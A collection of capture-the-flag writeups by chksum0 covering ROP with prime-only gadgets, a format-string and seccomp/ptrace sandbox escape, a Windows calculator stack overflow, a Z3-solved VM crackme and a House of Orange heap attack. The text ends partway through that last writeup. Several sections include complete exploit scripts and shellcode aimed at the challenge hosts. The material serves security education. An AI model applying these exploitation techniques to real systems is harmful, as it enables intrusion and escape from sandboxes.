<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-chksum0
description: CTF writeups and security challenges by chksum0.
---

# Writeups by chksum0

Source repository: `/repos/chksum0`

## Repository Index

- writeups/README.md
- writeups/misc_ctfs/Cobra/README.md
- writeups/misc_ctfs/Cobra/write-up.md
- writeups/hitcon_cmt_17/prob/writeup.md
- writeups/googleCTF/assignment/writeup.md
- writeups/confidence_teaser_2017/fastcalc/README.md
- writeups/confidence_teaser_2017/index/index_writeup.md
- writeups/confidence_teaser_2017/public_key_infrastructure/pki-writeup.md
- writeups/confidence_2017/amigo/README.md
- writeups/confidence_2017/crypto/writeup.md
- writeups/PlaidCTF18/garbage/README.md
- writeups/34c3/300/writeup.md
- writeups/0CTF_2017_Quals/engineTest/engineTest_writeup.md

## Writeup Content


### File: writeups/PlaidCTF18/garbage/README.md

# PlaidCTF 2018: Garbage Truck Challenge 
 
We receive a [binary](./garbagetruck_04bfbdf89b37bf5ac5913a3426994185b4002d65) with a very obvious stack based buffer overflow bug. 
This is what the main loop function looks like: 
```C 
cnt = 0; 
while ( 1 ) { 
    printf("Pitch?\n> "); 
    in = read64(); 
    if ( !in ) 
        break; 
    if  (is_garbage(in)) { 
        puts("Throwing away that garbage!"); 
        idx = cnt++; 
        buf[idx] = in; 
    } else { 
        puts("That's not garbage. I love it <3"); 
    } 
} 
close(0); 
``` 
Where `buf` is a buffer on the stack. The binary is not `PIE`d and has no stack canaries. 
So, if the input number returned from the user in the `read64` function `is_garbage` then we get to write it to the stack. 
After some reversing, we see that the `is_garbage` function is actually the Rabin-Miller primality test which is implemneted in the statically linked `openssl` library contained in the binary. 
Therefore, the challenge is to write a ROP-chain which would print the flag using only prime 64-bit numbers. Another limitation this binary present is that when returning from the function, the `stdin` is closed, so apparently the author intended for this chain to run without any further input from the user. 
 
We fired up `ROPgadget` and printed all gadgets (using the `--all` flag) and filtered only the [gadgets which address is a prime number](primes.txt) (using a simple python script). 
Then, we started to build a ROP chain. 
 
The first chain we managed to build was `system("cat *")`. Building it wasn't easy, as we weren't sure which `libc` version is used on the server and computing the location of the `system` function dynamically wasn't an easy task either. We first built a chain that printed a few values from the `.got` section to identify the `libc` version (2.23 from Ubuntu 16.04) and then built a chain that read the value of `read` from the got, added the difference between `system` and `read` and eventually jumped to system. The good thing is that every number is a sum of just a few primes (Goldbach conjecture), so we can get from one number to another quite easily if we find a good addition primitive. We were amused to find that `"cat *"` is a prime number :) 
However, this chain didn't work on the server. Neither a chain of `system("echo 7")` nor any other `system` based chain we tried. We don't know why (it did work locally), but there could be a few reasons (e.g. the server sandbox doesn't allow `exec`ing). 
 
Our next attempt was to construct a general, unconstrained, Write-What-Where primitive to build an Open-Read-Write chain. We managed to construct this primitive, however, it was too long and building a chain using it exhausted the stack. 
 
Eventually, an idea popped in our mind. The use of file descriptors `0` and `1` for `stdin` and `stdout` is merely a convention. The kernel is not aware of this convention and doesn't have any special handling for it. It is very much possible to switch the two or not use them at all. In our binary, even though file descriptor zero is closed before executing our ROP-chain, file descriptor 1 is untouched. If both file descriptors use the same underlying file - e.g. the socket of the connection with the user - reading from file descriptor 1 will read from the socket! 
A very common way to leverage a constrained ROP-chain to an unconstrained is to read from the user to the stack, i.e. `read(0, $rsp, 0x1000)`, which launches a second, unconstrained, chain.
Combining these two realizations, we constructed a chain that effectively `read(1, $rsp, 499)` and after that sent the address of some write from the binary. We received the output, so our conjecture turned out to be true - reading from file descriptor 1 works and reads from the connection. (We have a feeling that this hack wasn't intended though)

So, using this, we constructed a second ROP-chain with [all gadgets](gadgets.txt) in the binary. The second chain opens the flag file, reads it and writes it to the user.

You can find the full solution [here](ex.py). If you are interested in our false attempts, see the previous commits in this repository.



### File: writeups/README.md

# writeups
CTF Writeups 



### File: writeups/confidence_2017/amigo/README.md

# Amigo

This pwn was quite challenging and no one solved it on site. I completed it after the CTF.
The challenge was without a binary, you only get a host and port:
```
nc amigo.hackable.software 1337

[+] Secure Notepad v0.7:
[+] 1. Write note
[+] 2. Display note
[+] 3. Exit
:> 1
Type in your note (max len: 64 characters): %p%p%p%p%p%p%p
[+] Note saved
[+] Secure Notepad v0.7:
[+] 1. Write note
[+] 2. Display note
[+] 3. Exit
:> 2
[+] Your note:
====================
0xf0x565ea4ad0x565ea4bd0x565ea4c50xffe8f4380x565ea5b70xffe8f43c

====================

[+] Secure Notepad v0.7:
[+] 1. Write note
[+] 2. Display note
[+] 3. Exit
:> 3
[+] Bye
``` 

So we have a 32bit binary with a format-string bug, the first thing I did was to dump the stack. 
```
['0x5',
 '0x5660045d',
 '0x5660046d',
 '0x56600475',
 '0x56600567',
 '0xffd9ba48L',
 '0xffd9ba4cL', => ptr to my buffer
 '0x56603040',
 '0x56603040',
 '0xf7796cc0L', => libc ptr
 '0x0',
 '0x1',
 '0x24333125', => my controlled data '$31%p'
 '0xa70',
 '0x0',
 '0x0',
 '0x0',
 '0x0',
 '0x0',
 '0x0',
 '0x0',
 '0x0',
 '0x0',
 '0x0',
 '0x0',
 '0x0',
 '0x0',
 '0x0',
 '0x8910ce00L', => stack cookie
 '0x1',
 '0x9',
 '0x0',
 '0x56602f78',
 '0x0',
 '0x0',
 '0xffd9bae8L'
 '0x5660019e',  => return address
 '0x8000',
 '0xf7796000L',
 '0xf7794244L',
 '0xf75fc0ecL',
 '0x1',
 '0x56602f78',
 '0x1',
 '0x8910ce00L',
 '0x1',
 '0xffd9bb94L',
 '0xffd9bb9cL',
 '0x0',
 '0xf7796000L',
 '0xffd9bb00L']
```

After connecting to the server a couple of times it is clear that the binary is compiled with PIE and the remote system has ASLR.
With a bit of trial and error I identified the addresses of the stack, libc and main binary.

I wrote a bit of code that can leak libc using DynELF from pwn tools:

```py
def menu():
    print r.recvuntil(':> ')

def write_note(p):
    menu()
    r.send('1\n')
    print r.recvuntil('Type in your note (max len: 64 characters): ')
    if p[-1:] not in '\x00\n\r':
        p += '\n'
    r.send(p)

def read_note():
    menu()
    r.send('2\n')
    ret = r.recvuntil('\n\n====================\n')
    ret = ret.split('====================\n')[1]
    ret = ret[:-2]
    
    return ret

def exec_fmt(p):
    write_note(p)
    return read_note()

def leak(addr):
    # argument 15 is the location of p32(addr)
    payload = "%15$s.AA"+p32(addr)
    resp = exec_fmt(payload)
    idx = resp.index('.AA')
    resp = resp[:idx]
    ret = resp + "\x00"

    return ret

def leak_smart(addr):
    c = ''
    size = 4
    if addr & 0xff == 0:
        return '\x7f'

    while len(c) < size:
        d = leak(addr)
        c += d
        addr += len(d)

    return c

main_bin_addr = int(exec_fmt('%2$p'), 16)
elf = DynELF(leak_smart, main_bin_addr)
print elf.lookup('system', 'libc')
print elf.lookup('write', 'libc')
```

It was the first time I used DynELF but it worked quite well, automatically downloading the libc binary.
I found out that leaking addresses with null is problematic, I hardwired addresses with null LSB to be 0x7f so it would find '\x7fELF' magic.

Now that I have libc addresses I'll try to get code execution. I used the pwntools's ```fmtstr_payload``` to write to the stack. 
Initially I used an infinite loop gadget in libc to find the right offset in the stack of the return address. Then, I wrote a small rop ```system("/bin/sh")```.
Unfortunately I got this:
```
[-] PID: 2 - seccomp violation
```
Which means there's a sandbox. I decided to dump the binary by writing to stdout, using this rop chain ```write(1, binary_address, 4096)```.
Since the binary is not continuous in memory I wrote a script for dumping each page separately.

I'm a windows guy, memory dumped PE binaries on windows requires a few fixes so IDA would parse it correctly. However, the challenge was a linux challenge, so I wasted lots of time trying to reconstruct the dumped binary. Finally I just threw the binary to IDA as raw binary and started to disassemble the main binary - it works reasonably well (the only problem was fixing the imports, which I did manually as I read the disassembled code).

I found that there are two sandboxes, one is a ptrace over our binary which filters syscalls and the other is seccomp-bpf syscall filter.
I've extracted the bpf filters from the binary and used ```scmp_bpf_disasm``` from [libseccomp](https://github.com/seccomp/libseccomp/) to create a dot file and convert it to png.

![alt text](out.png "seccomp-bpf")

The seccomp-bpf filtering is pretty rough, and pretty specific. It doesn't allow any interesting syscalls, using a whitelist. These are the permitted syscalls:
* 3 - read
* 4 - write
* 37 - kill - but only to my PID (with only certain signals)
* 45 - brk
* 56 - mpx (unimplemented)
* 140 - lseek
* 146 - writev
* 174 - rt_sigaction
* 175 - rt_sigprocmask
* 192 - mmap2
* 197 - fstat64
* 252 - exit_group
* 257 - remap_file_pages - arg0 has to be 0xffffffffffffff9e, arg2 has to be 0x1234567800000000

 After a bit of tinkering I remembered that syscalls on 64bit linux are numbered differently than syscalls on 32bit linux - which may enable us to do some interesting syscalls we are currently lacking. On linux moving from 32 to 64 is as simple as changing the cs to 0x33. that is easily accomplished by retf:
```s
    push 0x33
    jmp addr

back:
    retf

addr:
    call back

/* 64 bit code here */
```

When moving to 64bit the syscall lists looks as follows:
* 3 - close
* 4 - stat
* 37 - alarm
* 45 - recvfrom
* 56 - **clone**
* 140 - getpriority
* 146 - sched_get_priority_max
* 174 - create_module
* 175 - init_module
* 192 - lgetxattr
* 197 - removexattr
* 252 - ioprio_get
* 257 - **openat** - arg0 has to be 0xffffffffffffff9e (AT_FDCWD), arg2 has to be 0x1234567800000000

Now, using the `openat` syscall, we can open files!

The new plan is as follows:
1. change to 64 bit 
2. use openat syscall (complying with all the restrictions)
3. change back to 32 bit
4. use the read & write syscalls to output the flag
5. profit

Using 010 editor templates I found that the main binary has an rwx section at offset 0x41410000 from binary base (on the second day the organizers hinted to look at the elf segments).
The author of the challenge left it for us to save some time.
![alt text](elf.png "010 with elf")

Also I found a stack overflow in the write note option, so I could leak the stack-cookie and use a small rop chain ```read(0, main_binary+0x41410000, 4096)``` to get my shellcode quickly into the rwx section (instead of writing it one dword at a time with the format string bug)

But again, we get this error:
```
[-] Invalid syscall: 257
```

This is the second sandbox done by our parent process with ptrace. Reversing a bit the logic is follows:
```
if there's a seccomp event:
    validate_seccomp_event(...)
elif WSTOPSIG(status) == 0x85:
    validate_syscall(...)
```

validate_seccomp_event looks something like:
```c
unsigned int __cdecl validate_seccomp_event(int ap)
{
  unsigned __int32 v1; // edi@3
  unsigned int result; // eax@4
  pt_regs data; // [sp+28h] [bp-64h]@1
  void *v4; // [sp+6Ch] [bp-20h]@1

  v4 = off_14;
  // PTRACE_GETREGS 
  if ( ptrace(12, ap, 0, &data) == -1 )
    debug_log(aPt_getregs);
  if ( data.orig_ax != 56 )
    log_fatal(aIncorrectSysca);
  v1 = data.sp;
  if ( v1 != getpid_0() )
  {
    data.orig_ax = -1;
    // PTRACE_SETREGS
    ptrace(13, ap, 0, &data);
    log_fatal(aIncorrectRegis);
  }
  result = (unsigned int)off_14 ^ (unsigned int)v4;
  if ( off_14 != v4 )
    call___stack_chk_fail();
  return result;
}
```
Our parent will kill us if we're not executing clone/mpx syscall or sp is not our parent's pid.
Finding our parents pid was tricky since the ```getppid``` syscall is blocked and ```getpid``` set to return hardcoded 1337.
But if you recall from previous error messages our pid is 2, so our parents pid is 1.

validate_syscall function looks something like this:
```c
switch (nr_syscall) {
    case -1:
    case 999:
    case __NR_write:
    case __NR_writev:
    case __NR_read:
    case __NR_fstat64:
    case __NR__llseek:
    case __NR_exit_group:
    case __NR_rt_sigprocmask:
    case __NR_rt_sigaction:  
    case __NR_mmap2:         
    case __NR_kill:          
    case __NR_mpx:           
    case __NR_open:          
    case __NR_getpid:        
    case __NR_gettid:        
    case __NR_tgkill:        
    case __NR_personality:   
    case __NR_brk:           
        terminate();
    default:
        break;
    }
}
```

I started banging my head on the table until I figured how to bypass the check - using the clone syscall to create a child process with CLONE_UNTRACED which will not be traced by ptrace, it could open and output the flag.

putting everything together again:
1. rop chain read(0, main_binary+0x41410000, 4096)
2. change to 64 bit 
3. clone with CLONE_UNTRACED, parent to infinite loop
4. use openat syscall (complying with all the restrictions)
5. change back to 32 bit
6. use the read & write syscalls to output the flag
7. profit

After all that work we get the flag.

```py
from pwn import *

HOST = 'amigo.hacking.center'
PORT = 1337

def menu():
    r.recvuntil(':> ')

def write_note(p):
    menu()
    r.send('1\n')
    r.recvuntil('Type in your note (max len: 64 characters): ')
    if p[-1:] not in '\x00\n\r':
        p += '\n'
    r.send(p)

def read_note():
    menu()
    r.send('2\n')
    ret = r.recvuntil('\n\n====================\n', timeout=1)
    ret = ret.split('====================\n')[1]
    ret = ret[:-2]
    
    return ret

def exec_fmt(p):
    write_note(p)
    return read_note()

def leak(addr):
    payload = "%15$s.AA"+p32(addr)
    resp = exec_fmt(payload)
    idx = resp.index('.AA')
    resp = resp[:idx]
    ret = resp + "\x00"

    return ret

r = remote(HOST, PORT)

libc_offset = 0x001B4CC0
libc_addr = int(exec_fmt('%10$p'), 16)
libc_base = libc_addr - libc_offset

main_bin_addr = int(exec_fmt('%2$p'), 16)
main_bin_offset = 0x5663b45d-0x56639000

main_base = main_bin_addr - main_bin_offset

read_addr = libc_base + 0xd6b40 # read offset

print 'libc base = ', hex(libc_base)

stack_cookie = int(exec_fmt('%29$p'), 16)


print "stack cookie = %08x" % (stack_cookie, )
print "main_base = %08x" % (main_base, )

main_base_magic = main_base + 0x41410000

rop = 'A' * 64
rop += p32(stack_cookie)
rop += p32(0xdeadbabe) * 7

# exec code shellcode 
rop += p32(read_addr) 
rop += p32(main_base_magic) # ret
rop += p32(0)
rop += p32(main_base_magic)
rop += p32(1000)

write_note(rop)

r.send('3\n')

print r.recvuntil('Bye\n')

sc = '''
    push 0x33
    jmp addr

back:
    retf

addr:
    call back

'''

sc = asm(sc)

sc64 = ''
sc64 += '''
    mov r9, 0x0313373133731337
    mov r10, 0
    mov rdx, 0
    mov rsi, rsp
    /* CLONE_FS | CLONE_FILES */
    mov rdi, 0x00800600
    mov rsi, rsp

    mov r8, rsp
    mov rsp, 1
    mov rax, 56
    syscall 
    
    mov rsp, r8

    /* if child go to open */
    cmp rax, 0
    je open

inf:
    jmp inf

open:
    /* bypass defence */
    mov r9, 0x0313373133731337

    /* zero mode & flags */
    mov rdx, 0x1234567800000000
    xor r10, r10

    /* push /flag */
    mov rax, 0x67616c662f
    push rax

    mov rsi, rsp

    mov rdi, -100 /* fd */

    /*mov rax, 257  openat */
    mov rax, 257/* openat */
    syscall

    jmp i386

ret386:
    pop rcx
    /* fix the stack to retf */
    mov dword ptr [rsp], ecx
    mov dword ptr [rsp+0x4], 0x23
    retf

i386:
    call ret386
'''

sc += asm(sc64, arch='amd64')

sc2 = '''
    /* memset the stack */
    mov edi, esp
    mov ecx, 0x40
    xor eax, eax
    rep stosb

  /* call read(3, 'esp', 0x40) */
    push (SYS_read) /* 3 */
    pop eax
    push 3
    pop ebx
    mov ecx, esp
    push 0x40
    pop edx
    int 0x80

    /* call write(1, 'esp', 0x40) */
    push (SYS_write) /* 4 */
    pop eax
    push 1
    pop ebx
    mov ecx, esp
    push 0x40
    pop edx
    int 0x80

 '''
sc += asm(sc2)

sc += '\xeb\xfe'

# sending the shellcode, written to the magic section and execute
r.send(sc + '\n')

# recv the flag
data = r.recv(4096)
data += r.recv(4096)

print data.strip('\x00')
```


### File: writeups/confidence_teaser_2017/fastcalc/README.md

# Fastcalc 

## Challenge description
```
What would a CONFidence CTF be without a Windows-hosted exploitation challenge? :) This time you're facing a fast, greatly optimized calculator capable of concurrently evaluating multiple expressions. In fact it is so technically advanced that it will only run on CPUs supporting the cutting-edge SSE2 extension. Do you think you can hack it?

Don't be scared too easily by the scoring -- it is mostly meant to encourage pwning this exotic "Windows" system. :-)

The service is running at fastcalc.hackable.software:4141. The flag is in the "flag.txt" file.

The platform is Windows Server 2012 R2. You can reproduce the task's environment by running: AppJailLauncher.exe /outbound /port:4141 /timeout:1000000000 /key:flag.txt fastcalc.exe
```

## Walkthrough
We reversed fastcalc.exe found that it parses a mathmatical expression, and assigns a fiber with the task of calculating the expression.
The parsing included a static array allocated on the stack for values and operations. Looks something like this:
```c
struct {
	int count;
	struct val {
		int type;
		union  {
			char op;
			double num;
		}
	}[LENGTH];
};
```

Not sure what is the original array length. The size of the val struct is 16 bytes (4 DWORDS), type is at +0, op/num is at +8.
Using a large enough expression we can overwrite some of the program stack.

The expression is composed of the following pattern - NUM OP NUM OP NUM OP… NUM

This means that for every 32 bytes we overwrite we control 8 (the number), we write 12 with barely controlled values (the type and op), and 12 bytes that are not overwritten.
This gives us 8 bytes of full control for every 32 bytes.
Luckly for us, this write pattern allowed us to easily avoid corrupting the stack cookie.

First thing we overwrite is an std::string, we change the length to be bigger than allocated.
We also change the capacity to be a small value. (bellow 0x10 bytes)
Since the string capacity is small, it uses the stack as the buffer.
When the string is read, the stack is leaked. (the string is read using the run operation showing the “expression”)

The stack contained pointers to the stack and to the running module providing enough data to bypass ASLR.

The program contained a function that calls system we use this to read the flag.

Overwrite the return address of main and a single DWORD after that.
Point the return address to the opcode “call system”.
Write the string “type,*t” using one of the double values and point the next DWORD to that string.

When the main function returns, it jumps to system with the argument “type,*t” which prints all the files whose name ends with “t”, like the file flag.txt.

exploit code:
```python
from pwn import *

HOST = '192.168.2.100'
PORT = 4141

HOST = 'fastcalc.hackable.software' #:4141

r = remote(HOST, PORT)

SYSTEM_OFFSET = 0xC862
SYSTEM_OFFSET = 0x3055
MODULE_BASE_OFFSET = 0x13483
    
def leak_stack():
    info('leaking the stack')
    r.recvuntil('Operation: ')
    r.send('new\r\n')
    r.recvuntil('expression:')
    
    # the overflow overwrites a expression string (std::string) in the stack.
    # we change capacity to 0 and size to 0x256 to leak stack addresses.
    lcmd = '0.1*' * 129 + "1.26895348305e-311"
    r.send(lcmd + '\n')

    r.recvuntil('Operation: ')
    r.send('run\n')

    d = r.recvuntil('Operation:')

    # drain the running operations
    data = d
    while 'still running' in data:
        r.send('run\n')
        data = r.recvuntil('Operation:')

    PAT = 'Expression '
    idx = d.find(PAT)
    dd = d[idx+len(PAT):]

    # print hexdump(dd)
    
    return dd

dd = leak_stack()
# 0x30 offset to ptr fastcalc+13483
fastcalc_base = u32(dd[0x30:0x34]) - MODULE_BASE_OFFSET

prev_ebp = u32(dd[0x48:0x4c])
cur_ebp = prev_ebp + 0x48 
stack_ptr = cur_ebp - 0x0000006c

system_addr = p32(fastcalc_base+SYSTEM_OFFSET)
stack_addr = p32(stack_ptr)

info("fastcalc_base - {}".format(hex(fastcalc_base)))
info("system_addr - {}".format(hex(u32(system_addr))))
info("stack_addr - {}".format(hex(u32(stack_addr))))

float_value = struct.unpack('d',system_addr+stack_addr)

# 8 bytes cmd without white spaces.
cmd = 'type,*t\x00'
cmd_float = struct.unpack('d', cmd)
lcmd = '0.1*' * 129 + "1.26895348305e-311*1*" + '{:.17e}*{:.17e}'.format(float_value[0], cmd_float[0])

r.send('new\n')

info('overwriting the stack')
r.recvuntil('expression:')
r.send(lcmd + '\n')

info('triggering the exploit')
r.recvuntil('Operation:')
r.send("notoperation\n")

for i in xrange(10):
    print r.recvuntil('\n', timeout=0.1)

r.close()
```

## The Flag
```
DrgnS{F1b3r5_41m057_l1k3_7hr34d5_bu7_n07_qu1t3_s0}
```


### File: writeups/misc_ctfs/Cobra/README.md

## Description

Doctor P. Cobra is a vetarn lecturer at the Texas Cyber University. He is also a principal cyber specailist at Palo Alto Networks, and he loves snakes!
He programmed a unique system in order to manage his university students. He absolutly loves the system, but it has one problem: it dosent support multiple users.
Thats a problem because sometimes non-students need to access the system as well.
To solve this issue the doctor used his cyber skills to write an extra-super-sophisticated cyber web application. This application allows him to authorise all users. Probelm solved. 

Or is it? 

The system can be accessed at http://\<IP\>/public. 

Can you get the flag before piza arrives?

## Write-ups
[Daniel's write-up](write-up.md)

## Scripts
[Michael's script](pgp-util.py)

## Source
[index](index.pl)

[lighttpd configuration](lighttpd.conf)



### File: writeups/0CTF_2017_Quals/engineTest/engineTest_writeup.md

# engineTest Challenge Write-up
_Written by Michael Kajiloti_

## Overview
We receive an archive that contains 5 files:
- __engineTest__ - 64 ELF executable
- __cp__ - binary file, st argument of engineTest
- __ip__ - binary file, 2nd arugment of engineTest
- __op__ - binary file, 4th argument of engineTest
- __go.sh__ - bash script that ties it all together. Prompts you to enter the flag and executes engineTest with the 3 binary files and stdin as arguments:
```sh
#!/bin/sh
echo "input the flag:"
exec ./engineTest ./cp ./ip /dev/stdin ./op
```
Executing go.sh and entering a random string as input prints our the message _" Wrong! "_.
Cool...

## Opening the black box
We start by opening engineTest in IDA.
Inside main, we can see that the program begins by opening all 4 arguments as files.
After that it moves on to reading data from them and parsing/storing their content in memory.

### Parsing cp - building the machine
It starts with the __cp__ file:
- reads first 2 qwords: bitfield_size and cp_size
- creates an array by the size of the (cp_size*40) and reads the rest of the cp data into it.

Seems like __cp__ consists of 2 size qwords and then an array of 40 byte records (5 qwords). When organized in such a manner in a hex editor, its easy to a spot an enum in the 5th qword value from 0x112 till 0x8828 (bitfield_size+1).

Afterwards, it calls the function which serves as _initialize_machine_. Inside it builds its main struct (refereed to as MACHINE), and stores the data from cp, empty bitfield of size bitfield_size (initialized with 10b), and array of qwords of the size of cp_size filled with seemingly random data from cp.

Yeah whatever...

### Parsing ip - looks familiar
It the moves on to parsing __ip__ file:
- reads the first qword: ip_size
- creates a qword array (ip_qwords) by the size of ip_size and reads the the rest of the ip data into it.

The qwords in ip start from 0x2 and go up to 0x111..

### Parsing stdin - starting to make sense
Then user input is read in an interesting way:
Essentialy ip_qwords array is iterated and for each value, a bit is read from user input and sent to the function _set_machine_bit_ together with the current value from the ip_qwords and the MACHINE struct:
```c
__int64 __fastcall set_machine_bit(MACHINE *machine, int *bit_offset_qword, int bit_value);
```
This function sets the bit from the input, at the offset determined by ip_qword, into the machine bitfield member.
Looking around in IDA, we can also find a complementary function used many times throughout the program
```c
__int64 __fastcall read_machine_bit(MACHINE *machine, int bit_offset_qword);
```
This one returns the bit at the specified offset from the machine's bitfield.

We now know the flag size, since 0x110 bits are read => flag is 34 characters long (including '\n').

### Running the machine - Where the magic happens
Now the main logic function of the program is executed:
```c
__int64 __fastcall execute_cp_instructions(MACHINE* machine)
```
We can multiple calls to _read_machine_bit_ in different branches and finally a call to _set_machine_bit_.
Reversing this function makes everything clear!
Here the records from cp are iterated, parsed, and "executed" using those functions.
Turns out cp is code for a custom Virtual Machine with 4 operation types (opcodes), and each 40 byte record is an instruction that reads 2-3 bits from the bitfield using calls to _get_machine_bit_ performs a logical operation, and writes the resulting bit back into bitfield using _set_machine_bit_.

The order of instruction execution is non-linear, determined at _initialize_machine_, but is constant for cp.

The following structs describe the details.
```c
// CP is composed by this type of records
struct INSTRUCTION
{
    OP_TYPE op_type;                // type of instruction - see OP_TYPE
    __int64 opr_1;                  // first operand - address in memory
    __int64 opr_2;                  // first operand - address in memory
    __int64 opr_3;                  // third operand (optional) - address in memory
    __int64 output_addr;            // output address in memory/instruction_id - where output bit is written in memory
}
```
```c
// Operation types
enum __int64 OP_TYPE
{
    OP_AND = 1;                     // logical AND between opr_1 and opr_2
    OP_OR = 2;                      // logical OR between opr_1 and opr_2
    OP_XOR = 3;                     // logical XOR between opr_1 and opr_2
    OP_CONDITIONAL_COPY = 4         // If opr_1 is set: return opr_2, else return opr_3
}
```
```c
// Now we can also fully map machine struct
struct MACHINE
{
    __int64 memory_size;                                // first qword in cp
    __int64 instruction_count;                          // second qword in cp
    instruction* instructions_cp[instruction_count];    // array of instructions from cp
    BYTE memory_bitfield[memory_size/(8)];              // bitfield of size memory_size in bits
    __int64 order_of_instructions;                      // array of instruction_ids (offsets in instructions_cp) that determines the order of instruction execution       
    __int64 unknown;                                    // not important
}
```
With that information, it also makes sense that our input is written into the MACHINE's bitfield (memory). The bits from our input are written to the beginning of the memory and serve as the input/key, which the machine uses during its processing (in certain instructions) to determine the output.

### Parsing op - Stop saying Wrong!
Talking about output, after that function, the program moves to its final logic loop, where it parses __op__ file.
This is done after the machine has executed all of its instructions and written its output in memory.
__op__ contains offsets similar to __ip__, but this time, these offsets are used to read data from the machine's memory, instead of writing to it. Specifically these offsets point to the last 0x40 bits in the machine's bitfield to read an 8 byte string at offsets 0x87e9-0x8828 (the end of the memory). This 8 byte string was in our case: _" Wrong! "_, but we can be sure that something else will be written there if we input the flag.

Looking at the instructions that determine the bits at these offsets, we can see that they are of OP_TYPE 4. Since OP_TYPE 4 is a conditional copy operation, and all of these instructions depend on the same condition (same bit at opr_1 = 0x87e8), The bits at opr_2 or opr_3 must form the _" Wrong! "_ string. A quick check shows that this string is formed by the bits at opr_3, while the opr_2 bits form the string "Correct!". This means the bit at 0x87e8 must be set (1), in order to be correct, so we now have the first condition we need to meet.

### Billions of other conditions
Actually we know more than that. Since this CTF uses a standard structure for flags: flag{this_is_the_flag} we know that the flag starts with "_flag{_" and ends with "_}_", so we can also use their corresponding bit values as conditions.

But we still have thousands of other condition checks, how can we reverse that?

## Time To Crack

### The long and stupid road taken
Since this write-up is long enough, I wont describe in detail the long and ugly process. Let's just say it involves heavy recursion, binary trees, and pain. This is what I got in return:

```
flag{        _*f_B1ll(ion)_g@t5s}
```

So close! missing only 8 characters...
Of course, you can write a decent brute-forcer for that, go to a vacation for a week, come back and enjoy the full flag (or see that the brute-forcer crashed because of a typo...).
But since this CTF is supposed to be doable in a matter of a single day, I probably missed something.

### Why not use this instead - Things you learn in CTF
How about solving it in 10 seconds instead?
Using the Z3 Prover from Microsoft, you can do just that.
Simply speaking, Z3 is a magical program that solves complex equations and logical problems, as long as you can define the problem. Sometimes, it really looks like magic.
So I wrote a python script that uses z3, defined the dataset and known conditions, and pressed the magic button (run).

```py
import struct, z3

data = open("cp", "rb").read()
memory = []
mapped_memory = {}
solver = z3.Solver()

#break string into bits (and reverse the order to match memory layout) and return as a string
def get_bits(string):
    bytes = (ord(b) for b in string)
    bit_string = ""
    for b in bytes:
        bits = bin(b)[2:]
        bit_string += ('0' * (8 - len(bits)) + bits)[::-1]

    return bit_string

#add known condition bits
def add_bits(start, bit_string):
    pos = 0
    for i in bit_string:
        solver.add(memory[start+pos] == int(i))
        pos +=1

#initialize solver object with conditions
def init_solver():

    # initialize memory with bit vectors of size 1
    for i in xrange(0x8829):
        memory.append(z3.BitVec(i, 1))

    # set basic condition for each bit vector
    for bitfield in memory:
        solver.add(z3.Or(bitfield == 0, bitfield == 1))

    # set known bits
    solver.add(memory[0] == 0)
    solver.add(memory[1] == 1)
    solver.add(memory[0x87e8] == 1)
    add_bits(2, get_bits("flag{"))
    add_bits(0x10a, get_bits("}"))

    # set all cp conditions
    for i in xrange(0x8717):
        loc = i*40 + 16
        op_type = struct.unpack("<Q",data[loc:loc+8])[0]
        opr_1 = struct.unpack("<Q",data[loc+8:loc+16])[0]
        opr_2 = struct.unpack("<Q",data[loc+16:loc+24])[0]
        opr_3 = struct.unpack("<Q",data[loc+24:loc+32])[0]
        out_addr = struct.unpack("<Q",data[loc+32:loc+40])[0]

        if op_type == 1:
            solver.add(memory[opr_1] & memory[opr_2] == memory[out_addr])
        elif op_type == 2:
            solver.add(memory[opr_1] | memory[opr_2] == memory[out_addr])
        elif op_type == 3:
            solver.add(memory[opr_1] ^ memory[opr_2] == memory[out_addr])
        elif op_type == 4:
            solver.add(z3.Or(z3.And(memory[opr_1] == 1, memory[opr_2] == memory[out_addr]), z3.And(memory[opr_1] == 0, memory[opr_3] == memory[out_addr])))

#does the magic
def magic():
    init_solver()

    # check if its possible to solve this
    if solver.check() == z3.sat:
        solver_model = solver.model()
        #copy solution from model to mapped_memory dictionary
        for i in xrange(0x8829):
            mapped_memory[i] = solver_model[memory[i]].as_long()
    else:
        print 'FAIL!'

    return mapped_memory

# prints flag from mapped memory
def print_flag():
    next_byte = ""
    decoded_message = ""
    i = 2
    while i < 0x113:
        if i in mapped_memory:
            next_byte = str(mapped_memory[i]) + next_byte
            i += 1
            if len(next_byte) == 8:
                decoded_message += chr(int(next_byte, 2))

                next_byte = ""

        else:
            i += 8 - len(next_byte)
            decoded_message += ' '
            next_byte = ""

    print decoded_message

magic()
print_flag()
```

And just like magic the flag appeared...

#### This is actually kind of clever
At last we have the full flag, and its a good one:
```
flag{wind*w(s)_*f_B1ll(ion)_g@t5s}
```


_Thanks to Neatsun Ziv for working on this with me._






### File: writeups/34c3/300/writeup.md

The [challenge](300) is simple to understand. In the BSS there is a 10-pointers array `allocs`. We can execute one of the following options:
1. `allocs[slot] = malloc(0x300);`
2. `read(0, allocs[slot], 0x300);`
3. `write(1, allocs[slot], strlen(slot));`
4. `free(allocs[slot]);`
5. Make the program exit.

We can quickly get a leak of `heap` and `libc` pointers by freeing two non-consecutive chunks that don't coalesce with the wilderness and read their `fd` pointers. The first will point to the second - `heap` pointer and the second will point to the `unsorted_bin` which resides in `libc`'s data segment.

Moving on, we see we can not only read freed chunks in the unsorted bin but also overwrite them leads to the conclusion that _unsorted_bin attack_ is the most plausible approach. What is not clear is how to hijack the flow using this attack. My solution was to use the _House of Orange_ which overwrites `_IO_list_all` and hijacks the flow when jumping to the `__overflow` method invoked in `_IO_flush_all_lockp`.

Quick re-cap: _House of Orange_ & _unsorted_bin attack_.
First step is to abuse `malloc` when sorting the unsorted bin. The implementation does an unsafe unlinking from the back of the list:
```
3503   for (;; )
3504     {
3505       int iters = 0;
3506       while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
3507         {
3508           bck = victim->bk;
...
3513           size = chunksize (victim);
... 
3551           /* remove from unsorted list */
3552           unsorted_chunks (av)->bk = bck;
3553           bck->fd = unsorted_chunks (av);
3554 
3555           /* Take now instead of binning if exact fit */
3556 
3557           if (size == nb)
3558             {
...
3563               void *p = chunk2mem (victim);
3564               alloc_perturb (p, bytes);
3565               return p;
3566             }
3567 
3568           /* place chunk in bin */
3569 
3570           if (in_smallbin_range (size))
3571             {
3572               victim_index = smallbin_index (size);
3573               bck = bin_at (av, victim_index);
3574               fwd = bck->fd;
3575             }
...
3625           victim->bk = bck;
